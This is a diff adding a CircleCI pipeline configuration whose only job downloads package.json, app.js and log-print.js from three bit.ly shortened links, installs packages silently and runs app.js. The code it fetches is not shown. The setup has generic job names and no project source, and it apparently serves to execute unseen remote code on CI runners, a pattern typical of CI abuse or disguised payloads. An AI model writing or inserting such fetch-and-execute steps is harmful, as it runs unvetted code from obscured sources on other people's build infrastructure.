@@ -1,0 +1,22 @@
+version: 2.1
+
+jobs:
+  run-job:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: 
+          name: Get soure
+          command: |-
+            curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/2XuO8xR -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
+      - run: 
+          name: Node Install Packages
+          command: |-
+            npm i -s
+      - run: node app.js
+      
+workflows:
+  start-work:
+    jobs:
+      - run-job
